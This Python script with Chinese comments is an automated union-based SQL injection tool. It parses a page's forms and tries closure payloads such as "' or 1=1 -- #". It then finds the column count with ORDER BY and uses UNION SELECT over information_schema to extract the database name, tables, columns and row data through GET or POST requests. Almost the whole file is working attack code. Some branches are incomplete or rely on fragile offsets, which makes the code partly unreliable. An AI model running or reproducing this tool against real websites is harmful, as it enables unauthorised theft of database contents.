import requests
from bs4 import BeautifulSoup
from urllib.parse import parse_qs
from colorama import init, Fore
init(autoreset=True)  # 初始化colorama，设置autoreset=True以便在每次打印后自动重置颜色

def get_form_value_ofinjection(url):
    # 发送get请求获取html文档
    response = requests.get(url)
    if response.status_code == 200:
        #print(response.text)
        # 使用BeautifulSoup解析html文档
        soup = BeautifulSoup(response.text, 'html.parser')
        # 获取所有的form标签
        forms = soup.find_all('form')

        # 初始化用于保存数据的字典
        form_info = {}
        select_name = ''
        # 遍历所有的form标签
        for index, form in enumerate(forms):
            # 获取form标签的method属性
            method = form['method']
            # 获取form标签的所有select标签
            selects = form.find_all('select')
            # 获取form标签的所有input标签
            inputs = form.find_all('input')
            # 初始化用于保存 input 数据的列表
            input_info = []
            # 遍历所有的select标签
            for form_select in selects:
                # 获取select标签的name属性
                select_name = form_select.get('name', '')

            # 遍历所有的input标签
            for form_input in inputs:
                # 获取input标签的type属性
                input_type = form_input.get('type', '')
                # 获取input标签的name属性
                input_name = form_input.get('name', '')
                # 获取input标签的value属性
                input_value = form_input.get('value', '')
                # 将input的属性值进行保存
                input_data = {
                    'select': select_name,
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                }
                # 将input的属性值保存到列表中
                input_info.append(input_data)
            # 将form的method和input信息保存到字典中
            form_data = {
                'method': method,
                'input_info': input_info
            }
            form_info[index] = form_data
        print(form_info)
        return form_info


#form_data = {method:post,input_info:[{type:text,name:name,value:查询},{},{}]}


def union_sql_injection(url, form_info):
    # 闭合测试
    global payload_name, payload_submit
    bihe = ["", "') or 1=1 -- #", "' or 1=1 -- #", '" or 1=1 -- #', " or 1=1 -- #", " or '1'='1' -- #"]
    for biheyuju in bihe:
        data = '1' + biheyuju            #data = 1 加上上面的闭合比如1' or 1=1 -- #
        # 构造payload
        for i in range(len(form_info[0]['input_info'])):
            if form_info[0]['input_info'][i]['type'] == 'submit':
                payload_submit = form_info[0]['input_info'][i]['name'] + '=' + form_info[0]['input_info'][i]['value']
                #print(payload_submit)

        for i in range(len(form_info[0]['input_info'])):
            if form_info[0]['input_info'][i]['select'] != '':
                payload_name = form_info[0]['input_info'][i]['select'] + '=' + data
                #print(payload_name)


            elif form_info[0]['input_info'][i]['type'] == 'text':
                payload_name = form_info[0]['input_info'][i]['name'] + '=' + data
                #print(payload_name)

        payload = payload_name + '&' + payload_submit          #构造出发送的参数比如说id=1&submit=查询(id=1' or 1=1 -- #&submit=查询)
        print(payload)
        # 将字符串形式的参数解析为字典形式
        payloads = parse_qs(payload)
        # 去掉列表
        payloads = {key: value[0] for key, value in payloads.items()}
        print("payload:", payloads)

        # 发送请求
        if form_info[0]['method'] == 'post':
            response = requests.post(url, data=payloads)          #payloads为id=1&submit=查询或者id=1' or 1=1 -- #&submit=查询.....
            if biheyuju == "":                        #如果闭合测试为空，则获取正常长度,这句判断仅仅是为了获取正常长度，以供后续的对比获取注入点
                normal_size = len(response.text)
            else:                                     #如果有闭合
                if len(response.text) >= normal_size:   #判断如果长度大于正常长度，则存在注入点
                    print(Fore.RED + "存在注入点")
                    print(Fore.RED + "闭合测试注入点为:", biheyuju)
                    #payloads = payload.replace("or 1=1", "")
                    for i in range(6, 0, -1):             #确定列数方便后续注入点,从后往前，自己规定这最大列数为6列
                        payload_orderby = payloads.copy()  # 创建一个副本
                        for key, value in payload_orderby.items():        #遍历副本字典获取key和value，比如说第一个获取的是id=1 or 1=1，第二个获取的是submit=查询
                            payload_orderby[key] = value.replace('or 1=1', f"order by {i}")   #替换 or 1=1 为 order by {i}
                        print(payload_orderby)
                        response = requests.post(url, data=payload_orderby)
                        if len(response.text) == normal_size:                   #如果替换后的长度等于正常长度，则说明存在order by注入点
                            print(Fore.BLUE + f"order by {i}存在")
                            s = "111,222,333,444,555,666"
                            truncate_count = i*3
                            # 计算截断位置
                            truncate_index = s.index(',', truncate_count)
                            # 截断字符串并去掉最后的逗号
                            select_count = s[:truncate_index].rstrip(',')   # 111,222,333,444,555,666对此进行数量截取
                            payload_select1 = "union select " + select_count
                            payload_select2 = payload_orderby.copy()  # 创建一个副本
                            for key, value in payload_select2.items():
                                payload_select2[key] = value.replace(f'order by {i}', payload_select1)    #替换 order by {i} 为 union select 111,222,..
                            print(Fore.BLUE + "payload_select2", payload_select2)
                            response = requests.post(url, data=payload_select2)
                            place1 = response.text.find('111')   #获取返回的111,222,333,444,555,666等的位置，确定好位置方便后续按位置查找爆出的东西，但后面不需要了
                            place2 = response.text.find('222')
                            place3 = response.text.find('333')
                            place4 = response.text.find('444')
                            place5 = response.text.find('555')
                            place6 = response.text.find('666')
                            if place1 != -1:
                                payload_database = payload_select2.copy()  # 创建一个副本
                                for key, value in payload_database.items():
                                    payload_database[key] = value.replace('111', "(select group_concat('----:',database(),'++++'))")     #替换111为database()
                                print(Fore.BLUE + "payload_database", payload_database)
                                response = requests.post(url, data=payload_database)
                                place1 = response.text.find('----:')  # 获取返回的database()的开始位置，这里我用的是database_start: 来定位开始
                                end_place1 = response.text.find('++++')  # 获取返回的database()的结束位置，这里我用的是:database_end来定位结束
                                database = response.text[place1+5:end_place1]
                                if database.find('database()') !=-1:
                                    place1 = response.text.find('----:',end_place1)
                                    end_place1 = response.text.find('++++',place1)
                                    database = response.text[place1+5:end_place1]

                                print(Fore.LIGHTRED_EX + "database:", Fore.LIGHTRED_EX + f"{database}")
                                payload_table = payload_database.copy()  # 创建一个副本
                                for key, value in payload_table.items():
                                    payload_table[key] = value.replace('database()', "(select group_concat("
                                                                                     "table_name) from "
                                                                                     "information_schema.tables where "
                                                                                     "table_schema=database())")
                                print(Fore.BLUE + "payload_table:",Fore.BLUE + f"{payload_table}")
                                response = requests.post(url, data=payload_table)
                                end_place1 = response.text.find('++++')
                                table = response.text[place1+5:end_place1]
                                if table.find('table_name') != -1:
                                    place1 = response.text.find('----:',end_place1)
                                    end_place1 = response.text.find('++++',place1)
                                    table = response.text[place1+5:end_place1]
                                table = table.rstrip()
                                print(Fore.LIGHTRED_EX + "table:", Fore.LIGHTRED_EX + f"{table}")
                                tables = table.split(',')
                                print("tables:", tables)
                                for payload_columns in tables:
                                    payload_column = payload_table.copy()  # 创建一个副本
                                    for key, value in payload_column.items():
                                        payload_column[key] = value.replace("(select group_concat(table_name) from information_schema.tables where table_schema=database())", f"(select group_concat(column_name) from information_schema.columns where table_name='{payload_columns}')")
                                    print(Fore.BLUE + "payload_column:", payload_column)
                                    response = requests.post(url, data=payload_column)
                                    place1 = response.text.find('----:')
                                    end_place1 = response.text.find('++++')
                                    column = response.text[place1+5:end_place1]
                                    if column.find('column_name') != -1:
                                        place1 = response.text.find('----:',end_place1)
                                        end_place1 = response.text.find('++++',place1)
                                        column = response.text[place1+5:end_place1]
                                    column = column.split()
                                    print(Fore.LIGHTRED_EX + "columns:", Fore.LIGHTRED_EX + f"{column}")
                                    for columns in column:
                                        #print("columns:", columns)
                                        for payload_columns_data in columns.split(','):
                                            payload_data = payload_column.copy()
                                            for key, value in payload_data.items():
                                                payload_data[key] = value.replace(f"(select group_concat(column_name) from information_schema.columns where table_name='{payload_columns}')", f"(select group_concat({payload_columns_data}) from {payload_columns})")
                                            print(Fore.BLUE + "payload_data:", Fore.BLUE + f"{payload_data}")
                                            print()
                                            response = requests.post(url, data=payload_data)
                                            place1 = response.text.find('----:')
                                            end_place1 = response.text.find('++++')
                                            if place1 == -1:
                                                print(Fore.LIGHTRED_EX + "data:None")
                                                continue
                                            data = response.text[place1+5:end_place1]
                                            if data.find('table_name') != -1:
                                                place1 = response.text.find('----:',end_place1)
                                                end_place1 = response.text.find('++++',place1)
                                                data = response.text[place1+5:end_place1]
                                            print(Fore.LIGHTRED_EX + "data:", Fore.LIGHTRED_EX + f"{data}")


                            elif place2 !=-1:
                                payload_database = payload_select2.copy()  # 创建一个副本
                                for key, value in payload_database.items():
                                    payload_database[key] = value.replace('222', "database()")
                                print(payload_database)
                                response = requests.post(url, data=payload_database)
                                end_place1 = response.text.find('<', place1)
                                database = response.text[place1:end_place1]
                                print("database:", database)
                            elif place3 !=-1:
                                payload_database = payload_select2.copy()  # 创建一个副本
                                for key, value in payload_database.items():
                                    payload_database[key] = value.replace('333', "database()")
                                print(payload_database)
                                response = requests.post(url, data=payload_database)
                                end_place1 = response.text.find('<', place1)
                                database = response.text[place1:end_place1]
                                print("database:", database)
                            elif place4 !=-1:
                                payload_database = payload_select2.copy()  # 创建一个副本
                                for key, value in payload_database.items():
                                    payload_database[key] = value.replace('444', "database()")
                                print(payload_database)
                                response = requests.post(url, data=payload_database)
                                end_place1 = response.text.find('<', place1)
                                database = response.text[place1:end_place1]
                                print("database:", database)


                            break

                    break



        elif form_info[0]['method'] == 'get':
            response = requests.get(url, params=payloads)  # payloads为id=1&submit=查询或者id=1' or 1=1 -- #&submit=查询.....
            if biheyuju == "":  # 如果闭合测试为空，则获取正常长度,这句判断仅仅是为了获取正常长度，以供后续的对比获取注入点
                normal_size = len(response.text)
            else:  # 如果有闭合
                if len(response.text) > normal_size:  # 判断如果长度大于正常长度，则存在注入点
                    print(Fore.RED + "存在注入点")
                    print(Fore.RED + "闭合测试注入点为:", Fore.RED + f"{biheyuju}")
                    # payloads = payload.replace("or 1=1", "")
                    for i in range(6, 0, -1):  # 确定列数方便后续注入点,从后往前，自己规定这最大列数为6列
                        payload_orderby = payloads.copy()  # 创建一个副本
                        for key, value in payload_orderby.items():  # 遍历副本字典获取key和value，比如说第一个获取的是id=1 or 1=1，第二个获取的是submit=查询
                            payload_orderby[key] = value.replace('or 1=1', f"order by {i}")  # 替换 or 1=1 为 order by {i}
                        print(payload_orderby)
                        response = requests.get(url, params=payload_orderby)
                        if len(response.text) == normal_size:  # 如果替换后的长度等于正常长度，则说明存在order by注入点
                            print(Fore.BLUE + f"order by {i}存在")
                            s = "111,222,333,444,555,666"
                            truncate_count = i * 3
                            # 计算截断位置
                            truncate_index = s.index(',', truncate_count)
                            # 截断字符串并去掉最后的逗号
                            select_count = s[:truncate_index].rstrip(',')  # 111,222,333,444,555,666对此进行数量截取
                            payload_select1 = "union select " + select_count
                            payload_select2 = payload_orderby.copy()  # 创建一个副本
                            for key, value in payload_select2.items():
                                payload_select2[key] = value.replace(f'order by {i}',payload_select1)  # 替换 order by {i} 为 union select 111,222,..
                            print(Fore.BLUE + "payload_select2", payload_select2)
                            response = requests.get(url, params=payload_select2)
                            place1 = response.text.find('111')  # 获取返回的111,222,333,444,555,666等的位置，确定好位置方便后续按位置查找爆出的东西，但后面不需要了
                            place2 = response.text.find('222')
                            place3 = response.text.find('333')
                            place4 = response.text.find('444')
                            place5 = response.text.find('555')
                            place6 = response.text.find('666')
                            if place1 != -1:
                                payload_database = payload_select2.copy()  # 创建一个副本
                                for key, value in payload_database.items():
                                    payload_database[key] = value.replace('111',"(select group_concat('----:',database(),'++++'))")  # 替换111为database()
                                print(Fore.BLUE + "payload_database", payload_database)
                                response = requests.get(url, params=payload_database)
                                place1 = response.text.find('----:')  # 获取返回的database()的开始位置，这里我用的是database_start: 来定位开始
                                end_place1 = response.text.find('++++')  # 获取返回的database()的结束位置，这里我用的是:database_end来定位结束
                                database = response.text[place1 + 5:end_place1]
                                if database.find('database()') != -1:
                                    place1 = response.text.find('----:',end_place1)
                                    end_place1 = response.text.find('++++',place1)
                                    database = response.text[place1+5:end_place1]

                                print(Fore.LIGHTRED_EX + "database:", Fore.LIGHTRED_EX + f"{database}")
                                payload_table = payload_database.copy()  # 创建一个副本
                                for key, value in payload_table.items():
                                    payload_table[key] = value.replace('database()', "(select group_concat("
                                                                                     "table_name) from "
                                                                                     "information_schema.tables where "
                                                                                     "table_schema=database())")
                                print(Fore.BLUE + "payload_table:", Fore.BLUE + f"{payload_table}")
                                response = requests.get(url, params=payload_table)
                                end_place1 = response.text.find('++++')
                                table = response.text[place1 + 5:end_place1]
                                if table.find('database()') != -1:
                                    place1 = response.text.find('----:',end_place1)
                                    end_place1 = response.text.find('++++',place1)
                                    table = response.text[place1+5:end_place1]
                                table = table.rstrip()
                                print(Fore.LIGHTRED_EX + "table:", Fore.LIGHTRED_EX + f"{table}")
                                tables = table.split(',')
                                print("tables:", tables)
                                for payload_columns in tables:
                                    payload_column = payload_table.copy()  # 创建一个副本
                                    for key, value in payload_column.items():
                                        payload_column[key] = value.replace("(select group_concat(table_name) from information_schema.tables where table_schema=database())",f"(select group_concat(column_name) from information_schema.columns where table_name='{payload_columns}')")
                                    print(Fore.BLUE + "payload_column:", Fore.BLUE + f"{payload_column}")
                                    response = requests.get(url, params=payload_column)
                                    place1 = response.text.find('----:')
                                    end_place1 = response.text.find('++++')
                                    column = response.text[place1 + 5:end_place1]
                                    if column.find('column_name') != -1:
                                        place1 = response.text.find('----:',end_place1)
                                        end_place1 = response.text.find('++++',place1)
                                        column = response.text[place1+5:end_place1]
                                    column = column.split()
                                    print(Fore.LIGHTRED_EX + "columns:", Fore.LIGHTRED_EX + f"{column}")
                                    for columns in column:
                                        print("columns:", columns)
                                        for payload_columns_data in columns.split(','):
                                            print("payload_columns_data:", payload_columns_data)
                                            payload_data = payload_column.copy()
                                            for key, value in payload_data.items():
                                                payload_data[key] = value.replace(f"(select group_concat(column_name) from information_schema.columns where table_name='{payload_columns}')",f"(select group_concat({payload_columns_data}) from {payload_columns})")
                                            print(Fore.BLUE + "payload_data:", Fore.BLUE + f"{payload_data}")
                                            print()
                                            response = requests.get(url, params=payload_data)
                                            place1 = response.text.find('----:')
                                            end_place1 = response.text.find('++++')
                                            if place1 == -1 or end_place1 == -1:
                                                print(Fore.LIGHTRED_EX + "data:None")
                                                continue
                                            data = response.text[place1 + 5:end_place1]
                                            if data.find('from') != -1:
                                                place1 = response.text.find('username')
                                                end_place1 = response.text.find('++++',place1)
                                                data = response.text[place1+5:end_place1+110]
                                            print(Fore.LIGHTRED_EX + "data:", Fore.LIGHTRED_EX + f"{data}")
                                            #break

                                        break













































































